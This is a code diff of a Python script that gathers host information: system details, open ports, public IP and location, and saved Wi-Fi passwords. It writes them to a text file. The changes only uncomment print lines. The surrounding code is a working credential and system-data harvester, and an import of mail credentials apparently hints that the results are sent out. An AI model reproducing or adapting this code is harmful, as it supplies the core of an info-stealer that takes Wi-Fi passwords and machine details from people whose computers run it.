@@ -11,14 +11,14 @@ from auth_data import passw, mail
 
 def system_info() :
     system_data = subprocess.check_output('systeminfo').decode('CP866')
-    #print(system_data)
+    print(system_data)
     with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
         file.write(f'SYSTEM INFO \n {system_data}\n {"*" * 100}\n ')
 
 
 def ports_info() :
     ports_data = subprocess.check_output('netstat -a').decode('CP866')
-    #print(ports_data)
+    print(ports_data)
     with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
         file.write(f'\nINFORMATION ABOUT PORTS \n {ports_data} \n {"*" * 100}\n')
 
@@ -32,7 +32,7 @@ def check_ip() :
     ip = soup.find('div', class_ = 'ip').text.strip()
     location = soup.find('div', class_ = 'value-country').text.strip()
     name_pc = soup.find('div', class_='ip-icon-label').text.strip()
-    #print(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')
+    print(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')
     with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
         file.write(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')
 
@@ -46,7 +46,7 @@ def check_wifi():
             password = [i.split(' : ')[1].strip() for i in profile_info if 'Key Content' in i or 'Содержимое ключа' in i][0]
         except IndexError :
             password = None
-        #print(f'WIFI INFORMATION\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
+        print(f'WIFI INFORMATION\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
         with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
             file.write(f'\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
 
